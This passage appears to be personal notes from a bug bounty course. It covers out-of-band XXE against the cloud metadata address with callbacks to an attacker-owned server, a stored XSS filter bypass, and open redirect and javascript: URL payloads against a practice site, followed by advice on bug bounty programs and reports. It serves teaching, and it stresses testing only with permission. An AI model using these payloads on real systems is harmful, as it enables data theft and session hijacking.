o) This is useful in 2 scenarios 
1) retrieve data from internal resources which we cant access and only the target web server can access  
2) to discover blind/out of bound XXE 

OUT OF BOUND XXE 
-> In previous example, while playing with XXE, we got useful error message, but in some scenarios you might not get useful error messages .In that case we can execute something like this and you wont see the results back 
-> Hence we dont know if our exploit is working or not

---> in that case we can send this request to a server that you own . You can simply run your own server and put the IP of your own server here :

<!DOCTYPE test [ <!ENTITY xxe SYSTEM "http://169.254.169.254/">

to 

<!DOCTYPE test [ <!ENTITY xxe SYSTEM "http://ownIP/">

-> After putting the ip and when we send this request , target webserver will send this request to your own server and therefore we will be able to the request from target server using the logs of our own server 
-> Hence you will note that the target webserver has an xxe vulnerability



72)  Live BBH:

Target website: https://bugbountytraining.com/fastfoodhackings/


a) Target tab in burpsuite: 
-> Target tab has mapped every single link that we clicked and every request we have sent
-> Target analyses every request  and response that was proxied through burp 

-> in Burpsuite pro version, we will able to filter in target by name 

b) Using regex in targe filter :

Pattern to check anything between question mark and =

Pattern:
\?.*?=


72_1) BBH - Discovering   a complex stored XSS 

a) USUAL PROCEDURE FOR GETTING XSS Vulnerability:
-> As part of testing XSS vulberabilities, our usual procedure is to see if the text we type is used anywhere in the page. 
--> If it gets used anywhere in the page, we can check if it can be used as html code, and by that way we can have html injection 
---> If there is html injection, we can check if the javascript can be executed in the page, which means that we can have an XSS vulnerability 



b) 
original:
var promotion = 'UKONLY'

Payload code: 
var promotion = 'UKONLY';alert(2);//'; 


c) When we use this in page:
-> In page it looks like this:

var promotion = 'UKONLY';(2); \\';

-> Here alert gets filtered and also double forward slashes are replaced with double backward slashes, hence the code got broken  
-> THus we have two problems: a) alert gets filtered b) double slashes get filtered 

d) New payload:

var promotion = 'UKONLY'; alert(2);var x='a'; 

-> Instead of comment lets have a javascript where we assign a value to variable 

-> To overcome alert filter  - we will use doubling technique :

aalertlert
 |
 |
 |
alert 

----> Newest payload:

Exploit:33 var promotion = 'UKONLY'; aalertlert(2);var x='a'; 


e) WIth this new payload, we are able to do: stored xss injection vulnerability



73) Discovering bugs in hidden elements 

a) Testing all functionality or clicking every button does not guarantee that we have discovere all the vulnerabilities

b) In this lesson, we will see how to discover vulnerabilities in hidden elements 

c) To use the same, we will use Chrome extension: LazySec or Unhide 
-> Both these extensions are used for showing hidden elements 

d) Open LazySec -> All -> Show Hidden Elements 

-> Here hidden elements will be shown in red box 


e) In url injecting javascript:

in javascript of page:

window.addEventListener('load', function())
{
const redirectUrl = urlParams.get('from');
const redirectType = urlParams.get('type');

if(redirectUrl===null)
{}
}


eg:
Exploit:34 https://bugbountytraining.com/fastfoodhackings/index.php?from=javascript:alert(3)



74) Discovering Bugs in hidden parameters: 

a) From the javascript of the page, we can conclude that this page takes two parameters: from and type 

###########
window.addEventListener('load', function())
{
const redirectUrl = urlParams.get('from');
const redirectType = urlParams.get('type');

if(redirectUrl===null)
{}
}

if(redirectType=='1')
{
window.location.href=getHashValue("redir");
}
###########

b) Here getHashValue helps to get whatever is present after the hash in the current url 

wind.location.href-> it is the location of the current page 

Exploit:35 https://bugbountytraining.com/fastfoodhackings/index.php?from=test&type=1#redir=https://google.com 



window.location.href=getHashValue("redir");


---> by this line, whatever website we put after #redir in the url, the user will be redirected to that page  


c) Thus by entering this url: https://bugbountytraining.com/fastfoodhackings/index.php?from=test&type=1#redir=https://google.com 
-> We got redirected to that page 

-> THus we will be have an Open redirect vulnerability here 

d) Now if we want to execute javascript, we can change the url like this :


Exploit:36 https://bugbountytraining.com/fastfoodhackings/index.php?from=test&type=1#redir=javascript:alert(4) 

-> Thus we have discovered a reflected xss vulnerability also in the same page 
-> And both of these vulnerabilties are in the hidden elements 


75) How to start bug hunting:
a) Dont test applications with no permission 

b) Test applications THAT HAVE A BUG BOUNTY PROGRAM 
-> Simple google search will return lots of them 
-> Or find them in bug bounty platforms 

c) Search in google for "bug bounty programs"  and it will list important ones like:

https://hackerone.com/bug-bounty-programs
https://www.facebook.com/whitehat
https://www.bugcrowd.com/bug-bounty-list/
https://www.microsoft.com/en-us/msrc/bounty
https://yeswehack.com/programs
https://security.apple.com/bounty/
https://bugcrowd.com/openai
https://brainstormforce.com/bug-bounty-program/


d) Top programs:
https://www.guru99.com/bug-bounty-programs.html

e) hackerone is the most popular one : https://hackerone.com/bug-bounty-programs
1) signup the website, as hacker , sign in as user : hackerone.com/opportunities/all 
2) Opportunities tab: will list all the opportunities
3) We can select Program Type :
BBP - Bug Bounty program 
VDP - Vulnerability disclosure program 
Private programs 
4) Asset Type : Windoes, android, source code, executable, Hardware/IoT 
5) Industry: Agriculture/Automotive/Aviation/Aerospace 
6) If we go down the page: we can see programs based on industry or asset or technologies etc 
7) Directory : will present the opportunities in a nice list view 

8) if we go to a particular company, we can see what is the reward they give 
9) In policy page, we can see what is in scope, domain, what is out of scope i.e which should not be tested 


76) Bug-Bounty Overview: 
a) This is Zaid's site for bug bounty: https://bug-bounty.com/
b) Another one: https://www.intigriti.com/
c) https://bugcrowd.com/bugcrowd  -> bu crowd as big as hackerone 
d) process in bug bounty: 
1) Register as a hacker account 2) Hunt for bugs 3) Profit 



77) Submitting a Bug Report:
● Ensure Vulnerability is valid 
● Ensure vulnerability is in scope 
● Provide as much details as possible 
● Provide screenshots 
● Provide a video 


a) Report in hacker one 
1) Asset 
2) Weakness 
3) Severity 
4) Title 
5) Description  
6) Steps to reproduce 
7) Impact 
8) Discovery details 
9) 
